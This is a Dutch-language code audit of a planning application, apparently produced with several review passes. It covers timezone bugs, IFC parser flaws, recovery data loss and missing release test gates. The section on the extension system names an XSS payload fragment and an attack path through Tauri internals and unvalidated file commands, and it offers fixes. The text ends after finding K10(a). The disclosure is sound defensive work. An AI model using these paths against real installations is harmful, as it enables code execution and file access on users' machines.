# Onderhoudbaarheidsonderzoek Open Planner Studio — hoofdrapport

**Onderzoeksstand:** commit-stand v2026.7.12 (`850b17e` / branch `claude/opus-5-orchestrator-1mkltc`), 2026-07-25.
**Omvang van het onderzochte systeem:** 249 TS/TSX-bestanden, 49.860 regels in `src/`; 83 regels Rust; 14 locales × 4 namespaces; 431 gedragscases in `tests/planning/`.

---

## 0. Leeswijzer

### Wat is onderzocht

Tien parallelle deelonderzoeken, elk met een eigen afgebakend gebied: architectuur & state, codemetrieken & dependencies, de IFC-laag, testbaarheid & kwaliteitsborging, UI/i18n/platformsplit, documentatie & release-proces, de strategische big picture, de systemische risicoketens, de GitHub-workflows, en een edgecase-sweep. Samen raken ze vrijwel elke regel van de codebase, de volledige CI/CD-keten, de documentatie en het extensiesysteem.

### Hoe

Elk deelrapport is daarna onderworpen aan een **hyperkritische review** die de claims tegen de echte code natrok, experimenten opnieuw uitvoerde, getallen hertelde en per bevinding `[BEVESTIGD]` of `[VERMOED]` toekende, met een expliciet poortoordeel. Die reviews zijn niet cosmetisch geweest: zes van de tien gaven het oordeel *"nee, niet in deze vorm"* of *"voorwaardelijk"*, en samen corrigeerden ze tientallen claims — waaronder enkele die in het oorspronkelijke rapport de prioritering droegen.

### Hoe betrouwbaar is dit document

Dit hoofdrapport geeft de **gecorrigeerde** werkelijkheid weer, niet de oorspronkelijke claims. Concreet betekent dat:

- Waar een review een claim weerlegde, staat hier de weerlegging. Voorbeelden: het Draw2D-convergentievoorstel (gebaseerd op een verkeerd gelezen commentaarregel), de "88 onvertaalde nl-strings" (getal klopt, duiding niet), "24 PR's" (het zijn er 12), "21,4 s per solve" (dat is `runCPM`, niet `solve`), de ontbrekende `await` in `release.yml` (de beschreven faalmodus bestaat niet onder Node 22), en "0 entiteiten" bij `ENDSEC;` in een taaknaam (in werkelijkheid 1 van 3 taken).
- Getallen die een review niet kon reproduceren zijn geschrapt of expliciet als onzeker gelabeld.
- Waar een deelrapport iets opblies, staat het hier in gecorrigeerde proportie — inclusief het omgekeerde geval, waar een review een bevinding juist **verzwaarde** (de `ifcGuid`-collisies, het gedeeltelijke recovery-herstel, de baselines-bug).

Alle tien de reviews zijn verwerkt. De edgecase-review kwam als laatste binnen en is de enige met een onvoorwaardelijk **"ja"**: geen enkele valse (c)-classificatie gevonden, severity nergens overdreven, en de hoofdclaim onafhankelijk hard bewezen. Wel corrigeerde hij drie kwantitatieve getallen naar beneden; die correcties staan hieronder verwerkt, niet de originelen.

### Notatie

- Verwijzingen naar code zijn `pad:regel`.
- Verwijzingen naar bronmateriaal gaan met bestandsnaam: `deelrapporten/rapport-x.md` en `reviews/review-x.md` (zie de index in §8).
- Ernst: **kritiek** (stil dataverlies of onbeschikbaarheid, treft gebruikers vandaag) · **hoog** · **middel** · **laag**.

---

## 1. Managementsamenvatting

**Dit is een bovengemiddeld goed onderhouden codebase.** Dat is geen beleefdheidsformule maar de uitkomst van tien onafhankelijke onderzoeken die er alle tien op uitkwamen, en van reviews die er expliciet naar op zoek gingen om het te weerleggen en dat niet konden. De harde signalen:

- **Nul `any`, nul `as any`, nul TODO/FIXME/HACK-markers** in 49.860 regels — alle drie hertelde en bevestigd. Vijftien `as unknown as` en één `@ts-expect-error`, elk met motivatie.
- **Een documentcontract met compile-time volledigheidschecks** (`src/state/documentContract.ts:146-188`, `src/state/snapshot.ts:53-60`): één canoniek veldregister voedt payload, hydrate, reset, recovery én undo-snapshot, en twee type-level asserts maken het onmogelijk om een `DocumentPayload`-veld te vergeten. De review heeft het voorgestelde uitbreidingsassert zelf geschreven en langs `tsc` gehaald; het werkt mechanisch.
- **Een gedragssuite van 431 cases over 22 batterijen plus 16 `check-*.ts`-scripts**, die de échte store + `CPMSolver`/`CalendarEngine` headless draait, met anti-circulaire verwachtingen (uit CPM-leerboeken, niet uit de eigen implementatie), `satisfies Required<…>`-fixtures en `KNOWN_GAPS` die falen zodra een gat gedicht wordt. Zelf gedraaid: 431/431, 6,5 s.
- **Een schone engine-grens**: nul store-imports in `src/engine/`; `GanttRenderer` krijgt alles via een options-object. Dát is de reden dat de headless suite kan bestaan.
- **Een platformsplit die klopt**: nul top-level `@tauri-apps/*`-imports in heel `src/`, één definitie van `isTauri()`, alle Tauri-aanroepen dynamisch binnen een guard.
- **Zichtbare, gedocumenteerde refactor-discipline**: `App.tsx` is met 370 regels geen god-component meer, de ribbon is een echte registry, de settings-conventie wordt gerespecteerd, en de IFC-laag heeft single-source-registries (`ifcTaskSlots.ts`, `ifcPsets.ts`) die aantoonbaar uit eerdere eigen audits zijn ontstaan.

**En er zitten een aantal scherpe, concrete gaten in.** Die zitten niet in "rommelige code" — er is nauwelijks rommelige code. Ze zitten in drie patronen:

1. **Aannames die één laag te ver reiken.** Een datumparser die lokale getters op een UTC-instant gebruikt; een STEP-tokenizer die niet weet waar een string begint; een recovery-reader die nooit gooit. Elk daarvan is correct op het happy path en corrumpeert stil daarbuiten.
2. **Vangnetten die niet vangen.** De round-trip-test heeft een handmatige veldlijst waar hij een compiler-afgedwongen tabel claimt te zijn; een testcase kan vacuüm groen zijn; `tests/` wordt niet getypecheckt; en er staat geen enkele testpoort vóór een onomkeerbare release of vóór de productie-deploy.
3. **Geen enkel gebruikerszichtbaar foutkanaal.** Fouten worden niet slecht afgehandeld — ze worden zorgvuldig gevangen en doelbewust doodgezwegen. Daardoor hebben mislukte opslag, mislukte auto-save, corrupte invoer en een kapotte updateketen voor de gebruiker allemaal exact hetzelfde symptoom: niets.

De belangrijkste enkelvoudige bevinding is een **live productiebug**: `parseDate` (`src/utils/dateUtils.ts:2-5`) is tijdzone-afhankelijk. Drie keer onafhankelijk gemeten met identieke uitkomst: de regressiesuite gaat van **431/431 naar 311/431** onder `TZ=America/New_York`, `America/Los_Angeles` en `Pacific/Midway`. De browserbuild staat productie-live, dus iedere gebruiker ten westen van Greenwich rekent vandaag met een planning die een dag verschoven is. De fix is één functie, en is bewezen compleet — met de patch draait de volledige suite groen in alle zeven geteste tijdzones.

De tweede structurele conclusie is procesmatig: **de kwaliteitsborging is uitstekend gebouwd maar niet aangesloten.** De suite draait in `ci.yml`, maar `ci.yml` triggert niet op tags en blokkeert `live.yml` niet. Een release en een productie-deploy passeren dus beide zonder dat één gedragstest is gedraaid. Dat is geen ontbrekende infrastructuur — die is er al — maar ontbrekende bedrading.

Tot slot een eerlijke proportie op de risico's die géén acuut probleem zijn: de dependency-achterstand is beheersbaar (vijf majors, één devDependency-CVE met verwaarloosbare exploiteerbaarheid), de duplicatie in de codebase is opvallend laag, de Rust-schil is inderdaad extreem dun, en de i18n-sleutelpariteit is 100 % over alle 56 bestanden. Het project draagt wel een **onderhoudsportfolio dat sneller groeit dan één maintainer kan dragen** (14 talen, 350 in-app doc-artikelen, vijf distributiekanalen, een eigen PDF-typografie-engine) en de **bus factor is hard 1**.

---

## 2. De kritieke bevindingen

Elf bevindingen die nu opgelost moeten worden. Per stuk: bewijs, impact, gecorrigeerde fix.

### K1 — `parseDate` is tijdzone-afhankelijk: de hele planning schuift een dag ten westen van UTC — **kritiek**

**Bewijs.** `src/utils/dateUtils.ts:2-5`:

```ts
export function parseDate(iso: string): Date {
  const d = new Date(iso);
  return new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));  // lokale getters
}
```

`new Date('2026-06-01')` levert UTC-middernacht; `getFullYear/getMonth/getDate` lezen die **lokaal** uit. Bij elke negatieve UTC-offset valt de datum een dag terug.

**Drie keer onafhankelijk gemeten** — door het deelrapport, door de review, en door mijzelf voor dit hoofdrapport — met identieke uitkomst:

| `TZ` | Resultaat |
|---|---|
| `Europe/Amsterdam`, `UTC`, `Asia/Tokyo`, `Pacific/Auckland` | **431/431** groen |
| `America/New_York`, `America/Los_Angeles`, `Pacific/Midway` | **311/431** — 120 falende cases, exit 1 |

**De reikwijdte is breder dan het deelrapport zelf beschrijft.** Dat noemde zes falende categorieën; de review telde er meer: naast `constraints`, `resource-load`, `resource-leveling`, `progress`, kalenders en `hours-relations` vallen ook `advanced-cpm`, `calendar`, `hours`, `baselines`, `boundary`, `lag-advanced`, `milestone-kinds`, `move-project` en `view` om, plús vijf `check-*`-scripts. Puur relatieve CPM overleeft (alles schuift uniform mee); alles met een **absolute** datum breekt.

**De zomertijd-variant is ook bevestigd**, met een directe probe onder `TZ=Atlantic/Azores`: winterdatums (`2026-01-15` → `01-14`, `2026-12-15` → `12-14`, UTC−1) schuiven terug, zomerdatums (`2026-03-30`, `2026-06-01`, UTC+0 door DST) blijven correct. Een taak die de maart-overgang kruist verandert daardoor van lengte — en het ontsnapt aan de suite omdat het ankerpunt `2026-06-01` in de zomer valt.

Bereik, zelf geteld: **100 aanroepen in 22 bestanden** — solver, kalender-engine, renderer, minimap, histogram, variance-rapport, leveler, CSV-reader, IFC-slots, printvoorbeeld, `moveProject`, de extensie-SDK. `Intl` gebruikt overal correct `timeZone:'UTC'`; alleen het *parsen* is stuk.

**Impact.** De browserbuild is een productie-deploy (`live.yml` → `open-planner-studio.open-aec.com`). Elke gebruiker in Noord- of Zuid-Amerika krijgt vandaag verschoven datums, verkeerde resourcebelasting per dag, verkeerde constraint-evaluatie en verkeerde feestdag-toepassing — zonder enige foutmelding.

**Fix — bewezen compleet.** Parse de datumkop tekstueel in plaats van via `new Date` + lokale getters; val alleen voor niet-ISO-invoer terug op `Date` mét UTC-getters. De uitgeschreven variant staat in `deelrapporten/rapport-edgecases.md` §1.1. De review heeft die patch op een kopie gezet en gedraaid: **431/431 in alle zeven tijdzones inclusief `Atlantic/Azores`, en de volledige `run.sh` — mét álle `check-*`-scripts — geeft exit 0 onder New York.** De fix dekt dus niet alleen de CPM-cases. Voeg daarna een **`TZ`-matrix toe aan `tests/planning/run.sh`**; zonder die matrix komt de bug terug.

---

### K2 — De STEP-parser is string-onveilig in **drie** lagen, en de writer produceert ongeldige headers — **kritiek**

**Bewijs.** Het deelrapport vond één laag; de review vond er drie, en de derde is de ergste.

| Laag | Code | Faalgeval (gemeten) |
|---|---|---|
| Sectie-split | `ifcReader.ts:101` — `content.split('DATA;')[1]?.split('ENDSEC;')[0]` | Taaknaam `Sloop ENDSEC; hergebruik` in een bestand met 10 taken → **3 taken**, 7 stil verdampt |
| Commentaar-strip | `ifcReader.ts:106` — globale `/*…*/`-verwijdering | Taaknaam `Sloop /* let op */ klaar` → `"Sloop  klaar"`, stil |
| Entity-regex | `ifcReader.ts:110` — non-greedy tot de eerste `);` | Taaknaam `Fase (fundering); beton` → `'Fase (fundering`; notitie met `);` → `notes: undefined` |

Alle vijf de round-trip-rijen uit `deelrapporten/rapport-ifc.md` B1 reproduceren letterlijk in `reviews/review-ifc.md`. De JSON-blob-psets (`OPS_TaskNotes`, `OPS_ExternalLink`, `OPS_StructureMeta`, `OPS_Baselines`, `OPS_SchedulingOptions`) zijn extra kwetsbaar: hun `JSON.parse` staat in een `try { } catch { /* negeren */ }` (`ifcPsets.ts:162`, `:224`; `ifcReader.ts:583`, `:1291`, `:1337`), dus corruptie leidt niet tot een fout maar tot **stil totaalverlies van dat veld**.

**Correctie op het strategische rapport.** Dat claimde "0 entiteiten — bestand leest als leeg" bij `DATA;`/`ENDSEC;` in een taaknaam. De review heeft dat nagebouwd tegen de echte `writeIFC`→`readIFC`: het is **1 van 3 taken**, niet 0. Dat is niet minder erg maar erger — een leeg bestand valt op, een bestand dat een derde teruggeeft niet.

**Waar "0 entiteiten" wél vandaan komt** is door beide deelrapporten gemist en door de review gevonden: `ifcWriter.ts:113-115` interpoleert `project.name`, `project.author` en `project.company` **rauw** in `FILE_NAME(...)`, zonder `ifcStr`. `DATA;` of `ENDSEC;` in de projectnaam zet die tokens vóór de echte sectiegrens → nul entiteiten, alles weg. En een gewone apostrof levert al syntactisch ongeldig STEP op: `FILE_NAME('O'Hara Tower.ifc', …)`. Onze eigen reader merkt dat niet omdat hij de header nooit aanraakt — precies waarom dit nooit is opgevallen. `Van 't Hof BV` als bedrijfsnaam produceert een bestand dat Synchro of BlenderBIM niet hoeft te accepteren.

**Impact.** `);` is normale Nederlandse plantekst (`"Fase 1 (ruwbouw); fase 2"`). En `writeIFC` is óók de auto-save, elke 10 s. Twee onafhankelijke round-trips door de échte store bevestigen het ergste geval: een taak met naam `Levering (beton); wk 12` en **duur 7** komt terug als naam `'Levering (beton` met **duur 5** en zonder `wbsCode`; een notitie met `);` verdwijnt volledig; en een lege naam komt terug als `$`. De controlecase (`Beton besteld wk 12`) is correct. De stille duurwijziging is het gevaarlijkst: **de planning verandert bij opslaan en heropenen, zonder enig signaal.** `splitArgs` — dat `inString` wél kent — draait pas ná de truncatie en kan het niet meer redden.

**Fix — gecorrigeerd.** De voorgestelde "~30 regels tokenizer" dekt alleen laag 3. Nodig is:
1. Eén quote-bewuste scan die *alle drie* de lagen bedient — sectiedetectie, commentaarstrip en entity-splitsing draaien op dezelfde `inString`-state-machine die `splitArgs` (`ifcReader.ts:125-161`) al heeft.
2. Header-escaping in de writer. **Niet** de "one-liner" uit het rapport: naïef `'${ifcStr(project.name)}.ifc'` levert `''O'Hara'.ifc'` op — erger dan nu. Het moet `ifcStr(project.name + '.ifc')` zijn.
3. Een eigen regressiebatterij **vóór** de verbouwing, met de vier bewezen faalvectoren (`);`, `/* */`, `ENDSEC;` in taaknaam, `ENDSEC;` in projectnaam).

Los daarvan blijft `B5(a)/(b)` staan: de writer schrijft rauwe UTF-8 in plaats van `\X2\`-escapes en de reader decodeert `\X2\`/`\S\`/`\X\` niet — elk niet-ASCII-teken uit Revit/Synchro/Navisworks komt zichtbaar kapot binnen.

---

### K3 — Baselines verdwijnen bij crash-herstel — **hoog** (live bug, fix is twee regels)

**Bewijs.** `src/hooks/useRecoveryRestore.ts:63-70` bouwt de `RecoveryDocInput` veld voor veld op en laat `baselines` en `activeBaselineId` weg. Beide velden zijn **optioneel** in `RecoveryDocInput` (`documentContract.ts:87-88`), dus `tsc` zwijgt; `payloadFromInput` zet ze correct door (`:243-244`) als ze er zouden staan; en de auto-save-writer schrijft ze wél weg via `buildWriteIFCInput`. De data staat dus in de snapshot en wordt op de laatste meter weggegooid.

Twee reviews hebben dit onafhankelijk end-to-end bewezen (`reviews/review-ifc.md`, `reviews/review-big-picture-systemisch.md`): auto-save schrijft `OPS_Baselines`, `readIFC` leest ze, `payloadFromInput` op de echte input levert `baselines: []`; met de velden erbij: 1 baseline. Ik heb het bestand zelf gelezen — de velden ontbreken inderdaad.

**Impact.** Na een crash verliest de gebruiker stil al zijn baselines. Verzwarend: na herstel staat `isDirty` op `true`, dus de eerstvolgende Ctrl+S schrijft het baseline-loze project over het origineel. Extra pijnlijk: `IFCPanel.tsx:19` draagt commentaar over precies deze bugklasse ("ONVOLLEDIGE IFC (baselines gingen verloren…)") — daar gefixt, hier niet. Dit is dezelfde bugklasse die op de schrijfkant is opgelost door `writeIFC` van 11 positionele parameters naar één verplicht invoer-object om te bouwen (`ifcWriter.ts:88-96`); de les is niet toegepast op de leeskant.

**Fix.** Direct: twee velden toevoegen. Structureel: laat `useRecoveryRestore` `parsed` spreaden (`...parsed`), zoals `payloadFromImport` dat op het open-pad al doet, óf maak de velden in `RecoveryDocInput` verplicht. Plus een assert in `check-document-contract.ts` die een baseline door de recovery-round-trip stuurt.

---

### K4 — Recovery is niet-atomair en `readIFC` gooit nooit: een afgekapte snapshot wordt als volwaardig hersteld en daarna gewist — **hoog**

**Bewijs.** Drie schakels die elk op zichzelf verdedigbaar zijn en samen datavernietiging opleveren:

1. `recoveryStore.ts:41-43` schrijft direct over het bestand (truncate't eerst), geen temp+rename. Nergens in `src/` staat een atomair-schrijfpatroon. Een crash midden in de write laat een afgekapte snapshot achter — precies het scenario waarvoor recovery bestaat.
2. `readIFC` bevat **nul** `throw`-statements en heeft geen validatiecontract. Gemeten (`deelrapporten/rapport-ifc.md` B4, bevestigd in review): lege string, `dit is helemaal geen IFC-bestand`, `{"foo":1}` en een afgekapte entity leveren alle vier `tasks=0`, project `"Geïmporteerd Project"`, `startDate` = vandaag. Nergens een fout.
3. Daardoor vuurt de per-document `try/catch` in `useRecoveryRestore.ts:61-80` nooit; de afgekapte snapshot komt door de `entries.length === 0`-poort (`:84`) omdat er wél een entry is, en wordt in de herstel-dialoog aangeboden.

**De review verzwaarde dit.** Het rapport beschreef het 0-taken-geval; de review mat het **gedeeltelijke** herstel via de echte `restoreDocuments` + `runCPM`: bij een op 70 % afgekapte snapshot 8 taken / 0 relaties; bij **80 % alle 10 taken en 0 van de 9 relaties**; bij 90 % 10 taken / 7 relaties. Geen crash, geen melding. Een compleet ogende planning zónder logicanetwerk — de gebruiker heeft geen enkele aanleiding tot twijfel. Dat is erger dan een leeg document.

Daarna wordt `clearRecovery()` aangeroepen — en de review bevestigde dat dat bij méérdere documenten net zo hard toeslaat: zowel `onRestore` (`:92`) als `onDiscard` (`:96`) roepen het aan, en `clearTauri` verwijdert elk bestand uit het manifest (`recoveryStore.ts:106-107`). Eén corrupt document neemt de rest mee. Bijkomend: `loadTauri:70` doet `JSON.parse` van het manifest **buiten** try/catch, terwijl de per-document-lees eronder wél is afgeschermd — één corrupt manifestbestand gooit dus alle documenten weg terwijl de losse `recovery.*.ifc`-bestanden nog gewoon op schijf staan.

**Fix — gecorrigeerd.** Temp+rename in `saveTauri`; een integriteitscheck in `readIFC` (eis de `ISO-10303-21`-kop én een afsluitende `END-ISO-10303-21;`, throw een getypeerde `IfcParseError`); `clearRecovery()` pas ná een geslaagde restore; een directory-scan-fallback als het manifest niet parst.

**Ingetrokken voorstel.** Het rapport stelde "een snapshot met 0 taken niet aanbieden". De review wees terecht af: een leeg-maar-echt document (verse wizard, kalender en resources ingericht) is legitiem, en omdat de flow doorloopt naar `clearRecovery()` zou die snapshot dan ook nog **gewist** worden. Filter op onparseerbaarheid, niet op taakaantal.

---

### K5 — Twee app-instanties wissen elkaars recovery-snapshots — **hoog**

**Bewijs.** Er is geen `tauri-plugin-single-instance` (`src-tauri/src/main.rs`, `Cargo.toml`). In een productiebuild is `recoveryBase === 'recovery'` zonder slug (`src/hooks/recoveryPaths.ts:9` — de per-worktree-slug bestaat alleen in dev). De opruimlus in `recoveryStore.ts:52-60` verwijdert **elk** bestand dat met `recovery.` begint, op `.ifc` eindigt en niet in de eigen keep-set zit:

```ts
const keep = new Set(docs.map((d) => ifcName(d.id)));
const prefix = `${recoveryBase}.`;
for (const entry of await readDir(dir)) { … if (… && !keep.has(name)) await remove(…); }
```

Twee vensters delen dezelfde `appDataDir`. Elke 10 s overschrijft A het manifest van B en verwijdert A alle snapshots van B — en omgekeerd. De review heeft de lus nagebouwd en op een gemengde listing gedraaid: bevestigd.

**Tweede fout in dezelfde lus, ook bevestigd:** de prefix `recovery.` van een productiebuild matcht óók de dev-worktree-bestanden `recovery.<slug>.*`. Eén keer de productiebuild starten wist alle herstel-snapshots van alle dev-worktrees. Eenzijdig — andersom gaat het goed, omdat de dev-prefix specifieker is.

**Webvariant** (uit de edgecase-sweep; door de review niet apart nagelopen): IndexedDB-records zijn gesleuteld op een `sessionStorage`-id, wat tabbladen normaal scheidt — maar "Tabblad dupliceren" kopieert `sessionStorage`, waardoor tab B's `clearRecovery()` de records van tab A wist.

**Fix.** `tauri-plugin-single-instance` (één regel), plus de opruimlus beperken tot wat in het **vorige eigen** manifest stond. Een `ownerId` + `heartbeatAt` in het manifest maakt het robuust voor het geval single-instance bewust niet gewenst is.

---

### K6 — Manifest-XSS die ook bij een **uitgeschakelde** extensie vuurt — **hoog** (desktop)

**Bewijs.** Dit is de scherpste vondst van het systemische onderzoek, en de review heeft hem regel voor regel bevestigd. `src/components/backstage/ExtensionManagerPanel.tsx:137` rendert `ext.manifest.icon` als **rauwe HTML**:

```tsx
<span dangerouslySetInnerHTML={{ __html: ext.manifest.icon }} />
```

Het manifest komt ongefilterd uit de ZIP: `installFromZipBlob` doet `JSON.parse(...)` (`extensionService.ts:177`) en zet het ongewijzigd in IndexedDB en de store (`:227-232`). Geen veldvalidatie, geen icon-whitelist, geen sanitizer in de repo.

En het vuurt **vóór** elke poort: `loadAllExtensions` registreert het manifest met `status:'disabled'` (`extensionLoader.ts:238-243`) vóór activatie, en de `minAppVersion`-gate gooit pas ín `enableExtension` (`:163-168`), ná registratie. `InstalledExtensionCard` rendert onvoorwaardelijk. Een extensie die niet mag draaien voert dus alsnog `<img src=x onerror=…>` uit zodra Backstage → Extensies opengaat.

**Correctie op het deelrapport.** Dat noemde drie gelijkwaardige injectiesites. De review toonde aan dat ze niet gelijkwaardig zijn: `Backstage.tsx:512` en `ribbonWidgets.tsx:421` renderen iconen die door **draaiende** extensiecode zijn geregistreerd — die zit al in dezelfde realm met volledige `window`-toegang, dus HTML-injectie levert daar niets extra's op. Dat zijn hygiënepunten. Alleen site 1 is een echte kwetsbaarheid. De fix (alle drie dichten) blijft juist; het dreigingsverhaal was met factor drie opgeblazen.

**De keten eromheen** (bevestigd, met correcties): de catalogus wordt zonder handtekening of checksum van GitHub raw gehaald (`extensionService.ts:18-37`); `installFromCatalog` fetcht een willekeurige `downloadUrl` (`:51-57`); één klik betekent downloaden, opslaan én uitvoeren, **zonder toestemmingsdialoog** (`ExtensionManagerPanel.tsx:273-278` — verwijderen heeft er wél een); de uitvoering is `new Function` in dezelfde realm, wat de code zelf erkent (`extensionLoader.ts:115-118`: *"dit is GEEN echte isolatie … permissies zijn een conventie"*); en `csp: null` (`tauri.conf.json:55`) laat exfiltratie in beide builds open.

**Twee correcties op het mechanisme.** (a) Een extensie kan `@tauri-apps/plugin-fs` **niet** importeren — `withGlobalTauri` staat niet aan en `require()` in de sandbox geeft alleen `'open-planner-studio'` terug. Wat hij wél kan is `window.__TAURI_INTERNALS__.invoke(...)` in dezelfde realm aanroepen. Zelfde conclusie, ander gat — en een hefboom die het rapport miste: internals afschermen of bevriezen vóór extensie-uitvoering. (b) De ongebruikte Rust-commands `read_file`/`write_file` (`src-tauri/src/main.rs:21-22`, `mod.rs:15-24`) zijn zonder padvalidatie via diezelfde route bereikbaar, buiten elke plugin-fs-scope om. Het docs-rapport classificeerde die als LAAG; de review corrigeerde dat naar minimaal MIDDEL, en de fix is twee regels.

**Wat níet kan.** Het metrieken-rapport stelde voor de capability `fs:allow-home-read-recursive` te schrappen. Dat breekt de app: `recentFiles.ts:6-11` bewaart `{kind:'path', path}` persistent in IndexedDB en `openRecentFile` gaat via `tauriBackend.ts:38-39` → `readTextFile(ref.path)` **zonder dialoog**. Runtime-scope uit een vorige sessie bestaat niet meer; de complete MRU-lijst valt om. De `write`-helft is wél kandidaat.

**Fix, in volgorde van kosten.** (1) De drie `dangerouslySetInnerHTML`-sites vervangen (~10 regels). (2) `read_file`/`write_file` uit de `invoke_handler` (2 regels). (3) Een niet-null CSP met beperkte `connect-src`. (4) `sha256` per catalogusentry + verificatie vóór uitvoering (~15 regels) en een consent-dialoog bij `installFromCatalog`. (5) Op termijn: extensiecode naar een Web Worker — het API-oppervlak is al een smalle DTO-grens (`extTypes.ts`/`extMappers.ts`) die zich op `postMessage` laat zetten, en een worker heeft geen `window` en dus geen `__TAURI_INTERNALS__`.

---

### K7 — Exports draaien geen `runCPM`: verouderde planningen gaan naar derden — **hoog**

**Bewijs.** `autoCalcCPM` staat standaard **uit** (`uiSlice.ts:69`, zelf geverifieerd). Mutaties zetten alleen `scheduleStale`; het enige signaal is een tekstje in de statusbalk. Alle vier exporters schrijven `task.time.earlyStart` — de CPM-uitvoer: `p6xmlWriter.ts:370-371`, `csvWriter.ts:84-85`, `mspdiWriter.ts:349-350`, en de IFC-writer.

`exportAs` (`fileSlice.ts:235-277`) doet geen enkele stale-controle en roept geen `runCPM` aan. Twee callsites: `Backstage.tsx:336` en — door het rapport gemist, door de review toegevoegd — `ribbonWidgets.tsx:384` (de ExportDropdown). Ook de PDF-export (`ReportPanel.tsx:254`) en het printvoorbeeld draaien geen `runCPM`. De `BaselineDialog` doet het wél goed (`BaselineDialog.tsx:12,121`) — juist de exports, waar de data naar buiten gaat, niet.

**Impact.** Dit is de enige keten waarvan de schade bij derden terechtkomt die datums contractueel lezen. Een aannemer exporteert een P6-XML of MS Project-bestand met datums die niet bij de huidige taken horen, en er is geen enkel signaal.

**Fix — gecorrigeerd.** De voorgestelde one-liner (`if (get().scheduleStale) get().runCPM();`) heeft een gat dat de review vond: bij een cyclus doet de solver `if (result.error) { s.cpmResult = result; return; }` (`scheduleSlice.ts:70-73`) — `scheduleStale` staat dan al op `false` en de export loopt gewoon door met oude `task.time`-waarden. De guard moet dus ook op `cpmResult.error` afbreken en de export weigeren met een zichtbare melding.

---

### K8 — Er is geen enkel gebruikerszichtbaar foutkanaal — **hoog** (vermenigvuldiger)

**Bewijs.** De catch-census verschilt per teller — het deelrapport zegt 106 blokken / 19 leeg / 26 console-only, de review kwam met een eigen accolade-matcher op **93 catch-blokken (+10 `.catch(`), 33 leeg of comment-only, 17 alleen `console.*`**. Neem de reviewcijfers als de reproduceerbare; het beeld is hoe dan ook onaantastbaar.

Wat er níet is: een kanaal om iets aan de gebruiker te tonen. `fileSlice.ts:179-181, 299-301, 377-379, 400-402` gaan alle vier naar `console.error`. Idem `useAutoSave.ts:61`, `useRecoveryRestore.ts:79,101`, `recoveryStore.ts:80`, `Backstage.tsx:247,494`. De enige gebruikersgerichte kanalen in de hele app zijn één `alert()` in `IFCPanel.tsx:54`, één `setError` in Backstage, en de standaard-uitgeschakelde debug-terminal.

Twee bijzonder scherpe gevallen:
- **`saveFile` heeft helemaal geen try/catch** (`fileSlice.ts:184-213`), en de Tauri-backend (`tauriBackend.ts:28-33`) vangt ook niets. Bij een reject wordt `setUI({pendingCloseDocId:null})` nooit bereikt (`CloseDocumentDialog.tsx:35-42`) → **de sluitdialoog blijft permanent staan**. Dit is Tauri-only; de webbackend vangt het wél netjes af (`webBackend.ts:94-96`).
- **`isDirty` wordt gewist op basis van verouderde inhoud**: `fileSlice.ts:188` serialiseert, `:195`/`:201` awaiten een native dialoog die minuten open kan staan, `:196`/`:210` zetten dan `isDirty = false`. Alles wat de gebruiker tijdens die await typt geldt als opgeslagen maar staat in geen enkel bestand.

**Fix — gecorrigeerd.** Het metrieken-rapport stelde voor een toastsysteem te bouwen; de review corrigeerde: **er is er al één**, met foutvariant en styling — maar als lokale `useState` in `GanttCanvas.tsx:59,174,296,1390,1478-1484`, onbereikbaar vanuit `fileSlice`. De juiste ingreep is die state naar `uiSlice` hijsen en de I/O-paden erop aansluiten, niet een tweede implementatie bouwen. Reken erop dat dit dáárom iets duurder is dan "een helper": de toast moet eerst uit het canvas-component omhoog. Sluit meteen `saveFile` in een try/catch en vervang de `alert()`.

---

### K9 — Geen testpoort vóór een onomkeerbare release, en geen vóór de productie-deploy — **hoog**

**Bewijs (drie onafhankelijke onderzoeken, alle bevestigd).**
- `release.yml` heeft in geen van zijn vier jobs een teststap. De enige indirecte controle is `tsc` via `beforeBuildCommand`.
- `ci.yml` triggert op branches en pull requests — een **tag** matcht geen van beide. Er is dus geen enkel mechanisme dat afdwingt dat de getagde commit ooit groene CI had. Een tag op een commit met rode suite wordt gebouwd, gesigneerd, gepubliceerd en via de auto-updater naar alle installaties gepusht. `snap.yml` erft dit.
- `live.yml` deployt naar productie bij elke push naar `main`, zonder `needs` en zonder `workflow_run`-gate. `ci.yml` draait parallel en kan rood worden nádat de deploy geslaagd is. `main` is wel protected, maar welke checks daar required zijn was niet zichtbaar — dat blijft een openstaande vraag.

**Twee versterkende gebreken in de suite zelf.**
- **`run.sh` faalt volledig stil bij een compile-fout in een check-script.** Elke esbuild-aanroep onderdrukt alle output (`>/dev/null 2>&1`) onder `set -euo pipefail`. Empirisch bewezen in zowel het deelrapport als de review: een syntaxfout geeft `EXIT=1` met **nul regels output**, en `set -e` breekt af vóór de resterende 15 checks en alle 431 cases. In CI: een rode job met een lege log.
- **De release-skill weet dat de suite-tail onbetrouwbaar is** (`SKILL.md:99-100`: *"De suite print 'alles groen' óók bij exit 1 — vertrouw op exitcode"*), maar dat is een menselijke instructie, geen mechanisme.

**Fix.** Een `test`-job vooraan in `release.yml` met exact de vier CI-commando's, en `needs:` daarop voor `create-release`. Voor `live.yml`: `workflow_run` op CI met success-gate, of de testcommando's herhalen vóór de deploy. In `run.sh`: stderr niet onderdrukken en per bundelstap `|| STATUS=1` zodat de suite doorloopt.

---

### K10 — De vangnetten die dit soort bugs moeten opvangen, vangen niet — **hoog**

Twee onafhankelijke mazen, allebei experimenteel bewezen en door de review overgedaan.

**(a) De round-trip-test heeft een handmatige veldlijst waar hij een compiler-afgedwongen tabel claimt te zijn.** `tests/planning/check-ifc-roundtrip.ts` stelt in zijn eigen kop dat de batterij zelf-uitbreidend is: een nieuw domeinveld geeft een compile-fout, dus de round-trip bewaakt het automatisch. Uitgevoerd (deelrapport én review, onafhankelijk):

1. Nieuw veld `verantwoordelijke?: string` op `Task`.
2. `tsc` faalt op twee plekken: `src/engine/moveProject.ts:91` en `check-ifc-roundtrip.ts:197`.
3. Beide fouten opgelost zoals een ontwikkelaar dat zou doen. Reader en writer niet aangeraakt.
4. Resultaat: **`OK ifc-roundtrip: alle checks groen (14)`, exit 0.**

Oorzaak: de vergelijking loopt over `canonTask()` (`:333-353`), een met de hand opgesomde veldlijst. De review scherpte het aan: **géén enkele andere poort vangt het** — document-contract (200 asserts), adapters-hours (127), move-project (123) blijven alle drie groen. Een nieuw domeinveld wandelt langs twee compile-gates én 431 tests zonder één byte te round-trippen. Dit is exact de bugklasse (stil veldverlies) waarvoor die test is gebouwd, en het is de reden dat K3 kon ontstaan.

